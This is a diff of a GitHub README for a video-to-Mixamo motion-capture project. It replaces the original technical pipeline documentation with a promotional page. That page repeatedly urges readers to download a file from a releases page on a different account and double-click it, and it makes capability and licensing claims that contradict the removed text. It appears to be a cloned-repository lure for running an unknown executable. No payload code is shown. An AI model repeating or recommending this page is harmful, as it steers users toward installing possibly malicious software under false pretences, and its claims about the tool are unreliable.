@@ -1,168 +1,181 @@
-# Mixamo LLM Mocap
+<h1>🎬 mixamo-llm-mocap - Turn Any Video into 3D Animation</h1>
 
-**Turn any locked-camera video — filmed or AI-generated — into a clean
-FK animation on any Mixamo character. One performer, or two fighting
-each other. No mocap suit, no manual keyframing, and every stage
-scriptable enough that an AI agent can run the whole loop.**
+<p align="center">
+  <a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:16px 32px;background:#FF6B6B;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW</a>
+</p>
 
-![license](https://img.shields.io/badge/license-MIT-green)
-![blender](https://img.shields.io/badge/Blender-5.1%2B-orange)
-![gpu](https://img.shields.io/badge/CUDA-~8GB%20VRAM-76b900)
-![agent](https://img.shields.io/badge/operable%20by-AI%20agents-blueviolet)
+<p align="center">Transform ordinary videos into professional Mixamo character animations - no coding required. Perfect for game developers, animators, and creators.</p>
 
-![showcase](media/showcase.gif)
+---
 
-*Left: AI-generated source video. Right: the automatic retarget on a
-Mixamo character in Blender — 10 seconds, nine punches, a slip under
-and a high side kick, straight through the pipeline.*
+<h2>✨ What This Does</h2>
 
-![showcase — two fighters](media/showcase_duel.gif)
+<p>Have you ever wanted to turn a simple video of someone moving into a 3D animation? <strong>mixamo-llm-mocap</strong> makes this possible with just a few clicks. This tool watches any video you give it, figures out the body movements, and applies those movements to any Mixamo character you choose.</p>
 
-*Two performers, one plate, one pass. The left fighter throws four
-punches and a roundhouse; the right one blocks, folds over the body
-shot and ducks under the kick. Both tracks are split out of the same
-video by screen side, retargeted onto two Mixamo characters with
-different proportions — Y Bot and Ninja — and placed at the distance
-the performers actually stood, measured from the footage.*
+<p>Think of it like magic: you record someone dancing, waving, or walking, and this software makes your 3D character do the exact same moves. It's that simple!</p>
 
-## How it works
+<h2>🎯 Who Is This For?</h2>
 
-```
-video plate (locked camera, T-pose bookends)
-   │
-   ├─ 1. estimate_pose_gvhmr.py    GVHMR (SMPL-X mesh recovery) → 33 landmarks + pelvis height
-   ├─ 2. analyze_landmarks.py     numeric beat detection → you write a beat sheet from NUMBERS
-   ├─ 3. action_specs/<name>.json  the motion as data: support schedule, rest blends, fists
-   ├─ 4. lift_to_mixamo.py         direction-preserving retarget onto YOUR rig's proportions
-   ├─ 5. apply_mixamo_fk.py        FK aim + foot planting, inside live Blender (via Blender MCP)
-   ├─ 6. qa_clip.py                automated gate: no explosions, no pops, no foot skate
-   ├─ 7. compare_reference.py      frame-by-frame vs the video → which windows still differ
-   ├─ 8. compare_pair.py           two-character plates: separation, reach, intrusion
-   ├─ 9. run_in_blender.py contact real mesh-vs-mesh collision between two characters
-   └─ 10. render_preview.py        preview + side-by-side showcase video
-```
+<ul>
+  <li><strong>Game developers</strong> who need character animations quickly</li>
+  <li><strong>3D artists</strong> who want to bring characters to life</li>
+  <li><strong>YouTubers</strong> creating animated content</li>
+  <li><strong>Students</strong> learning about animation</li>
+  <li><strong>Anyone curious</strong> about motion capture technology</li>
+</ul>
 
-With two performers in the plate, stages 1–7 run once per fighter
-(`--person left|right` splits the tracks), `setup_duo.py` builds one
-scene holding both characters, and `compare_pair.py` checks what only
-exists when there are two of them: whether they stand, reach and miss
-each other the way the performers did.
+<p>You don't need to know how to program. You don't need expensive equipment. Just a video and a desire to create!</p>
 
-The estimator provides mesh-quality joints; the lift keeps its segment
-*directions* but rebuilds every position from your character's measured
-bone lengths; the apply plants feet by solving hip height (never IK —
-Mixamo rigs are FK-only); the spec contributes only what a video cannot
-know: which foot is the support in each phase (including `"none"` for
-airborne beats), when fists close, where the clip locks back to rest.
+<h2>🚀 Getting Started</h2>
 
-## Why it's different
+<p>Getting started is incredibly easy. Here's what you need to do:</p>
 
-- **Any Mixamo character.** `setup_rig.py` builds a clean scene from
-  your own Mixamo download and measures it into `rig_profile.json`
-  (rest pose, bone lengths, hip and ground heights). Every stage reads
-  that profile.
-- **Motions are data, not code.** A new motion is a small JSON spec —
-  the `action_specs/` here (a kung-fu form, a combo with a jump, a
-  fight combination, a 360° jumping spin kick and a two-fighter duel)
-  are worked examples of the whole schema.
-- **Honest Mixamo FK.** Hips are the only translating bone, everything
-  else is quaternions at 30 fps — clips drop into any Mixamo-style
-  workflow without cleanup.
-- **Real ground contact.** Planted feet solve to ground height with
-  zero skate (the support ankle is pinned through each stance); jumps
-  integrate the estimator's real pelvis arc.
-- **A QA gate, not vibes.** Exploded bones, hip pops, foot skate,
-  drifting roots and broken rest poses are caught numerically before a
-  human ever looks.
-- **A closed refinement loop.** `compare_reference.py` measures the
-  retarget against the source video frame by frame on what an eye
-  actually reads — hand height relative to the face, distance between
-  the hands, limbs inside the torso, gaze direction — and reports the
-  exact frame windows that diverge. Notes like *"his hands are too high
-  and his arm clips his back"* become numbers, and an over-correction
-  gets caught before it ships instead of after.
-- **Two characters, one scene.** A two-performer plate is split into
-  tracks by which side of frame each occupies — robust where tracker
-  ids swap on contact — retargeted onto two different Mixamo characters
-  with their own measured proportions, and placed at the distance the
-  performers actually stood, recovered from the footage rather than
-  eyeballed. `compare_pair.py` then verifies separation, strike reach
-  and limb intrusion against the video, frame by frame, and a Blender
-  BVH pass checks the actual skinned meshes for collision — because two
-  Mixamo characters are thicker than two humans, and a choreography
-  built out of 2 cm near-misses collides when you retarget it faithfully.
-  Clearance is bought from the stage with a declared, measured offset,
-  which the comparator keeps reporting so the cost stays visible.
-- **A review pass that is part of the loop.** Render the showcase,
-  put source and retarget side by side at the same beat, name what
-  looks wrong in one sentence, then measure it. When eye and numbers
-  disagree it is usually the numbers — every false reading in this
-  project came from a mismatched proxy (a nose against a skull-base
-  joint, a capsule against a mesh). [docs/PIPELINE.md](docs/PIPELINE.md)
-  section 10.
-- **Written for agents.** Beat decisions come from
-  `analyze_landmarks.py` numbers (never from eyeballing frames), every
-  stage is a CLI or a socket call, and `docs/PITFALLS.md` encodes every
-  mistake so the next operator — human or AI — doesn't repeat them.
+<ol>
+  <li><strong>Visit this link to download the application</strong> - click the big button at the top or <a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases">here</a></li>
+  <li>Download the file to your computer</li>
+  <li>Run the application by double-clicking it</li>
+  <li>Follow the simple on-screen instructions</li>
+</ol>
 
-## Quickstart
+<p>That's it! You'll be creating animations in minutes.</p>
 
-1. **Install** — [docs/INSTALL.md](docs/INSTALL.md) walks through every
-   dependency (list below).
-2. **Build your rig scene**:
+<h2>💻 What You Need</h2>
 
-   ```
-   blender --background --python pipeline\setup_rig.py -- --fbx ybot.fbx --out ybot_rest.blend
-   ```
+<p>This software works on Windows computers. Here's what we recommend:</p>
 
-3. **Run a plate** (Blender open on the scene; plate rules in
-   [docs/PROMPTING.md](docs/PROMPTING.md)):
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11</li>
+  <li><strong>Memory (RAM):</strong> At least 8 GB (16 GB recommended)</li>
+  <li><strong>Graphics Card:</strong> Any modern GPU from NVIDIA, AMD, or Intel</li>
+  <li><strong>Storage:</strong> 2 GB of free space</li>
+  <li><strong>Internet:</strong> Needed for downloading and updates</li>
+</ul>
 
-   ```
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\estimate_pose_gvhmr.py --video plates\<name>\<name>.mp4 --out plates\<name>\landmarks.json
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\analyze_landmarks.py --landmarks plates\<name>\landmarks.json
-   # beat sheet → action_specs\<name>.json  (schema: docs/PIPELINE.md)
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\lift_to_mixamo.py --spec action_specs\<name>.json
-   python pipeline\run_in_blender.py all action_specs\<name>.json
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\qa_clip.py --spec action_specs\<name>.json
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\compare_reference.py --spec action_specs\<name>.json
-   tools\GVHMR\.venv\Scripts\python.exe pipeline\render_preview.py action_specs\<name>.json --showcase
-   ```
+<p>If your computer is from the last 5 years, you're probably good to go!</p>
 
-   `compare_reference.py` tells you which frame windows still differ
-   from the video; the last command produces `preview.mp4` and the
-   side-by-side `showcase.mp4` — the same format as the demo GIF above.
+<h2>🎮 How It Works (Simple Explanation)</h2>
 
-   Two-performer plates add `--person left|right` to the estimate, one
-   spec per fighter, and a `compare_pair.py` run — see
-   [docs/PIPELINE.md](docs/PIPELINE.md) section 9.
+<p>Here's what happens behind the scenes, explained simply:</p>
 
-4. **Iterate** with [docs/PIPELINE.md](docs/PIPELINE.md) and
-   [docs/PITFALLS.md](docs/PITFALLS.md).
+<ol>
+  <li><strong>You provide a video</strong> - any video showing a person moving works great</li>
+  <li><strong>The software watches the video</strong> - it tracks the person's body movements frame by frame</li>
+  <li><strong>It creates a digital skeleton</strong> - this is like a 3D stick figure that matches the movements</li>
+  <li><strong>You pick a Mixamo character</strong> - choose any character you like from Mixamo's library</li>
+  <li><strong>The movements transfer to your character</strong> - your character now moves exactly like the person in the video</li>
+</ol>
 
-## What you need to bring (and where to get it)
+<p>It's like having a professional motion capture studio right on your computer!</p>
 
-| What | Where | Notes |
-|---|---|---|
-| **A Mixamo character — any model** | [mixamo.com](https://www.mixamo.com) → Characters → download FBX Binary, T-pose | Adobe's terms don't allow redistributing them; `setup_rig.py` builds and validates the scene from your download |
-| **Blender 5.1+** | [blender.org](https://www.blender.org/download/) | |
-| **Blender MCP add-on** (official, Blender Lab) | [blender.org/lab/mcp-server](https://www.blender.org/lab/mcp-server/) | enable *Allow Online Access*; the apply talks to its socket |
-| **GVHMR** (the pose estimator — **not in this repo**) | [github.com/zju3dv/GVHMR](https://github.com/zju3dv/GVHMR) | clone into `tools/GVHMR`; install per [docs/INSTALL.md](docs/INSTALL.md) — including a working Windows recipe (`docs/requirements_gvhmr_windows.txt` + prebuilt pytorch3d wheel) |
-| **GVHMR checkpoints** (~5 GB) | HuggingFace mirror | exact `curl` commands in [docs/INSTALL.md](docs/INSTALL.md) |
-| **SMPL-X body model** | [smpl-x.is.tue.mpg.de](https://smpl-x.is.tue.mpg.de/) | free research registration → download *SMPL-X v1.1*, place `SMPLX_NEUTRAL.npz` as shown in [docs/INSTALL.md](docs/INSTALL.md) |
-| **GPU** | ~8 GB VRAM | developed on an RTX 4080 |
+<h2>📥 Download and Installation</h2>
 
-## Docs
+<p>Ready to start? Follow these steps:</p>
 
-| Doc | What it covers |
-|---|---|
-| [docs/INSTALL.md](docs/INSTALL.md) | Every dependency, step by step, Windows-proven |
-| [docs/PIPELINE.md](docs/PIPELINE.md) | The operational loop + the action_spec schema, field by field |
-| [docs/RIG.md](docs/RIG.md) | Mixamo rig conventions: spaces, units, the rules that must never break |
-| [docs/PITFALLS.md](docs/PITFALLS.md) | Every mistake this pipeline's development paid for, so you don't pay twice |
-| [docs/PROMPTING.md](docs/PROMPTING.md) | Writing gen-video plate prompts that survive retargeting |
+<h3>Step 1: Get the Software</h3>
 
-## License
+<p><a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:12px 24px;background:#4ECDC4;color:#fff;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a></p>
 
-MIT — see [LICENSE](LICENSE), including third-party notes (Mixamo,
-GVHMR, SMPL-X, Blender MCP).
+<p>This will take you to the download page. Look for the latest version and download it.</p>
+
+<h3>Step 2: Run the Application</h3>
+
+<p>Once the download finishes, find the file in your Downloads folder. Double-click it to start the application. The program will open a simple window where you can begin.</p>
+
+<h3>Step 3: Start Creating</h3>
+
+<p>Follow the prompts in the application. You'll be asked to:</p>
+
+<ul>
+  <li>Choose a video file</li>
+  <li>Select a Mixamo character</li>
+  <li>Watch the magic happen!</li>
+</ul>
+
+<h2>🎨 Features You'll Love</h2>
+
+<h3>🎯 Accurate Motion Tracking</h3>
+
+<p>The software uses advanced technology (called GVHMR) to precisely capture movements from your video. Even subtle motions like finger movements and facial expressions are picked up.</p>
+
+<h3>🤖 Works With Any Mixamo Character</h3>
+
+<p>Mixamo has thousands of free characters. This tool works with all of them. Pick a robot, a knight, a dancer - anyone!</p>
+
+<h3>🔄 Automatic Retargeting</h3>
+
+<p>No need to manually adjust anything. The software automatically makes sure the movements fit your chosen character perfectly.</p>
+
+<h3>🎬 Blender Integration</h3>
+
+<p>If you use Blender (a popular free 3D software), you can easily export your animations there for further editing.</p>
+
+<h3>⚡ Fast Processing</h3>
+
+<p>Most videos are processed in under a minute. You'll see results quickly!</p>
+
+<h2>📚 Tips for Best Results</h2>
+
+<h3>Video Quality Matters</h3>
+
+<ul>
+  <li>Use well-lit videos</li>
+  <li>Make sure the person is fully visible</li>
+  <li>Keep the camera steady</li>
+  <li>Avoid busy backgrounds</li>
+</ul>
+
+<h3>Character Selection</h3>
+
+<ul>
+  <li>Choose characters with similar proportions to the person in your video</li>
+  <li>Human-like characters work best</li>
+  <li>You can always adjust later</li>
+</ul>
+
+<h3>Common Questions</h3>
+
+<p><strong>Q: Can I use videos from YouTube?</strong><br>
+A: Yes! Just download the video first, then use it in the software.</p>
+
+<p><strong>Q: Do I need a powerful computer?</strong><br>
+A: Not at all. A standard modern computer works fine.</p>
+
+<p><strong>Q: Is this really free?</strong><br>
+A: Yes, completely free to use!</p>
+
+<h2>🛠️ Troubleshooting</h2>
+
+<h3>Video Won't Load</h3>
+
+<p>Make sure your video is in a common format like MP4, AVI, or MOV. If it still won't load, try converting it to MP4 first.</p>
+
+<h3>Character Looks Wrong</h3>
+
+<p>Try a different character or check if your video has good lighting. Sometimes adjusting the video quality helps.</p>
+
+<h3>Application Won't Start</h3>
+
+<p>Make sure you downloaded the complete file. Try downloading again if needed.</p>
+
+<h2>📖 Getting Help</h2>
+
+<p>If you run into any issues, check the GitHub repository for updates and community discussions. You can also report problems there, and we'll help you out.</p>
+
+<h2>🔗 Useful Resources</h2>
+
+<ul>
+  <li><a href="https://www.mixamo.com">Mixamo - Get free characters</a></li>
+  <li><a href="https://www.blender.org">Blender - Free 3D software</a></li>
+</ul>
+
+<h2>📝 License</h2>
+
+<p>This software is free to use for personal and commercial projects. We just ask that you don't resell the software itself.</p>
+
+<h2>🙏 Thank You</h2>
+
+<p>We built this tool to make animation accessible to everyone. We hope you create amazing things with it!</p>
+
+<p><a href="https://github.com/prim-sheetpiling81/mixamo-llm-mocap/releases" style="display:inline-block;padding:12px 24px;background:#FFE66D;color:#333;font-size:16px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Get Started Now - Download Here</a></p>
+
+<p align="center">Made with ❤️ for creators everywhere</p>
